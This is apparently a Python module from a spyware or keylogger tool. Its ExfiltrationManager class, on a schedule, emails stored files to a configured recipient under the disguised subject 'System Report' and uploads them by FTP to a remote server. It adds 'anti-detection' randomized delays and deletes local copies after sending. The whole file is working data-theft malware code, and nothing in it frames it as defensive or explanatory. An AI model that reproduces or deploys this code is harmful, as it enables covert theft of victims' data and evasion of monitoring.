import smtplib
import ftplib
import time
import random
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from datetime import datetime, timedelta
import logging
import schedule

class ExfiltrationManager:
    """Handles data exfiltration via email and FTP"""
    
    def __init__(self, config, storage_manager):
        self.config = config
        self.storage = storage_manager
        self.running = False
        
    def start_exfiltration(self):
        """Start scheduled exfiltration"""
        self.running = True
        
        # Schedule email exfiltration
        if self.config.is_enabled('exfiltration.email.enabled'):
            interval_hours = self.config.get('exfiltration.email.interval_hours', 24)
            schedule.every(interval_hours).hours.do(self._email_exfiltration)
        
        # Schedule FTP exfiltration
        if self.config.is_enabled('exfiltration.ftp.enabled'):
            interval_hours = self.config.get('exfiltration.ftp.interval_hours', 12)
            schedule.every(interval_hours).hours.do(self._ftp_exfiltration)
        
        # Start scheduler thread
        scheduler_thread = threading.Thread(target=self._run_scheduler, daemon=True)
        scheduler_thread.start()
    
    def stop_exfiltration(self):
        """Stop exfiltration"""
        self.running = False
    
    def _run_scheduler(self):
        """Run the scheduler"""
        while self.running:
            schedule.run_pending()
            
            # Anti-detection: randomize check intervals
            if self.config.is_enabled('anti_detection.randomize_timing'):
                delay = random.uniform(30, 90)  # 30-90 seconds
            else:
                delay = 60
            
            time.sleep(delay)
    
    def _email_exfiltration(self):
        """Exfiltrate data via email"""
        try:
            files_to_send = self.storage.get_all_files()
            if not files_to_send:
                return
            
            # Email configuration
            smtp_server = self.config.get('exfiltration.email.smtp_server')
            smtp_port = self.config.get('exfiltration.email.smtp_port')
            username = self.config.get('exfiltration.email.username')
            password = self.config.get('exfiltration.email.password')
            recipient = self.config.get('exfiltration.email.recipient')
            
            if not all([smtp_server, username, password, recipient]):
                logging.warning("Email configuration incomplete")
                return
            
            max_retries = self.config.get('exfiltration.email.max_retries', 3)
            
            for attempt in range(max_retries):
                try:
                    # Create message
                    msg = MIMEMultipart()
                    msg['From'] = username
                    msg['To'] = recipient
                    msg['Subject'] = f"System Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    
                    # Add body
                    body = f"System report generated at {datetime.now().isoformat()}"
                    msg.attach(MIMEText(body, 'plain'))
                    
                    # Attach files (limit to avoid size issues)
                    files_sent = 0
                    max_files_per_email = 5
                    
                    for file_path in files_to_send[:max_files_per_email]:
                        try:
                            with open(file_path, 'rb') as attachment:
                                part = MIMEBase('application', 'octet-stream')
                                part.set_payload(attachment.read())
                            
                            encoders.encode_base64(part)
                            part.add_header(
                                'Content-Disposition',
                                f'attachment; filename= {file_path.name}'
                            )
                            msg.attach(part)
                            files_sent += 1
                        
                        except Exception as e:
                            logging.warning(f"Failed to attach file {file_path}: {e}")
                    
                    # Send email
                    server = smtplib.SMTP(smtp_server, smtp_port)
                    server.starttls()
                    server.login(username, password)
                    text = msg.as_string()
                    server.sendmail(username, recipient, text)
                    server.quit()
                    
                    logging.info(f"Email sent successfully with {files_sent} files")
                    
                    # Clean up sent files if configured
                    if self.config.get('cleanup.delete_after_exfiltration', True):
                        for file_path in files_to_send[:max_files_per_email]:
                            self.storage.delete_file(file_path)
                    
                    break  # Success, exit retry loop
                    
                except Exception as e:
                    logging.warning(f"Email attempt {attempt + 1} failed: {e}")
                    if attempt < max_retries - 1:
                        # Anti-detection: random delay between retries
                        delay = random.uniform(60, 300) if self.config.is_enabled('anti_detection.randomize_timing') else 120
                        time.sleep(delay)
                    else:
                        logging.error("All email attempts failed")
        
        except Exception as e:
            logging.error(f"Email exfiltration error: {e}")
    
    def _ftp_exfiltration(self):
        """Exfiltrate data via FTP"""
        try:
            files_to_send = self.storage.get_all_files()
            if not files_to_send:
                return
            
            # FTP configuration
            server = self.config.get('exfiltration.ftp.server')
            port = self.config.get('exfiltration.ftp.port', 21)
            username = self.config.get('exfiltration.ftp.username')
            password = self.config.get('exfiltration.ftp.password')
            remote_path = self.config.get('exfiltration.ftp.remote_path', '/logs')
            
            if not all([server, username, password]):
                logging.warning("FTP configuration incomplete")
                return
            
            max_retries = self.config.get('exfiltration.ftp.max_retries', 3)
            
            for attempt in range(max_retries):
                try:
                    # Connect to FTP server
                    ftp = ftplib.FTP()
                    ftp.connect(server, port)
                    ftp.login(username, password)
                    
                    # Change to remote directory
                    try:
                        ftp.cwd(remote_path)
                    except ftplib.error_perm:
                        # Try to create directory if it doesn't exist
                        try:
                            ftp.mkd(remote_path)
                            ftp.cwd(remote_path)
                        except:
                            pass
                    
                    # Upload files
                    files_sent = 0
                    for file_path in files_to_send:
                        try:
                            remote_filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{file_path.name}"
                            
                            with open(file_path, 'rb') as file:
                                ftp.storbinary(f'STOR {remote_filename}', file)
                            
                            files_sent += 1
                            
                            # Anti-detection: small delays between uploads
                            if self.config.is_enabled('anti_detection.randomize_timing'):
                                time.sleep(random.uniform(1, 5))
                        
                        except Exception as e:
                            logging.warning(f"Failed to upload file {file_path}: {e}")
                    
                    ftp.quit()
                    logging.info(f"FTP upload successful, {files_sent} files sent")
                    
                    # Clean up sent files if configured
                    if self.config.get('cleanup.delete_after_exfiltration', True):
                        for file_path in files_to_send:
                            self.storage.delete_file(file_path)
                    
                    break  # Success, exit retry loop
                    
                except Exception as e:
                    logging.warning(f"FTP attempt {attempt + 1} failed: {e}")
                    if attempt < max_retries - 1:
                        # Anti-detection: random delay between retries
                        delay = random.uniform(60, 300) if self.config.is_enabled('anti_detection.randomize_timing') else 120
                        time.sleep(delay)
                    else:
                        logging.error("All FTP attempts failed")
        
        except Exception as e:
            logging.error(f"FTP exfiltration error: {e}")
    
    def force_exfiltration(self):
        """Force immediate exfiltration"""
        if self.config.is_enabled('exfiltration.email.enabled'):
            self._email_exfiltration()
        
        if self.config.is_enabled('exfiltration.ftp.enabled'):
            self._ftp_exfiltration()